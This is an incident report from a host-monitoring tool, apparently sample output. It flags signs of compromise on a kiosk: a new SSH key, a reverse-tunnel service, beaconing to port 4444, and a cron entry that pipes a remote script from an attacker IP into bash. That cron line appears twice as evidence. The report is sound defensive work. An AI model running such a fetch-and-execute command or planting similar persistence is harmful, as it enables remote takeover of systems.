# GhostWire Sentinel Incident Report

Generated: 2026-05-18T03:45:27.175580+00:00
Host: kiosk-01
Snapshot captured: 2026-05-17T00:15:00+00:00
Baseline captured: 2026-05-17T00:00:00+00:00
Baseline approved by: sudarshan at 2026-05-18T03:45:21.505119+00:00

## Summary

- Total findings: 9
- Suppressed allow-listed findings: 1
- Critical: 1
- High: 5
- Medium: 3
- Low: 0

## Priority Queue

1. **critical** - New SSH key observed outside baseline. (baseline.new_ssh_keys)
2. **high** - New service observed outside baseline. (baseline.new_services)
3. **high** - New cron job observed outside baseline. (baseline.new_cron_jobs)

## Findings

### 1. New SSH key observed outside baseline.

- Severity: `critical`
- Type: `baseline.new_ssh_keys`
- Evidence: `fingerprint=newadmin001, line=2, source=/home/kiosk/.ssh/authorized_keys, type=ssh-rsa`
- Recommended next step: Validate the key owner, rotate affected credentials, and remove unauthorized keys.

### 2. New service observed outside baseline.

- Severity: `high`
- Type: `baseline.new_services`
- Evidence: `name=reverse-tunnel.service, state=enabled`
- Recommended next step: Inspect the unit file, check enablement history, and disable unknown startup services.

### 3. New cron job observed outside baseline.

- Severity: `high`
- Type: `baseline.new_cron_jobs`
- Evidence: `command=*/15 * * * * curl -fsSL http://198.51.100.77/p.sh | bash, line=2, source=/etc/cron.d/update`
- Recommended next step: Review the cron source, confirm change ownership, and remove unapproved scheduled execution.

### 4. Cron job executes a command pattern commonly used for persistence or remote execution.

- Severity: `high`
- Type: `persistence.cron`
- Evidence: `command=*/15 * * * * curl -fsSL http://198.51.100.77/p.sh | bash, line=2, source=/etc/cron.d/update`
- Recommended next step: Treat remote script execution in cron as high priority until proven authorized.

### 5. Startup service name matches a suspicious persistence pattern.

- Severity: `high`
- Type: `persistence.service`
- Evidence: `name=reverse-tunnel.service, state=enabled`
- Recommended next step: Check service file contents, install time, and whether it launches a tunnel or payload.

### 6. Outbound connection targets a suspicious remote marker or port.

- Severity: `high`
- Type: `connection.suspicious`
- Evidence: `process=python, protocol=tcp, remote=198.51.100.77:4444`
- Recommended next step: Isolate the host if this remote is unexpected and preserve connection evidence.

### 7. New outbound connection observed outside baseline.

- Severity: `medium`
- Type: `baseline.new_connections`
- Evidence: `process=python, protocol=tcp, remote=198.51.100.77:4444`
- Recommended next step: Validate the remote destination and block suspicious egress while investigating.

### 8. Running process includes command-line behavior worth investigating.

- Severity: `medium`
- Type: `persistence.process`
- Evidence: `args=python -c import socket,subprocess, command=python, pid=777, ppid=1, user=kiosk`
- Recommended next step: Capture process details and compare against deployment history.

### 9. Repeated outbound connections to the same remote may indicate beaconing.

- Severity: `medium`
- Type: `connection.repeated_remote`
- Evidence: `remote=198.51.100.77:4444, count=3`
- Recommended next step: Check for periodic callbacks, tunnel processes, and firewall logs for recurrence.

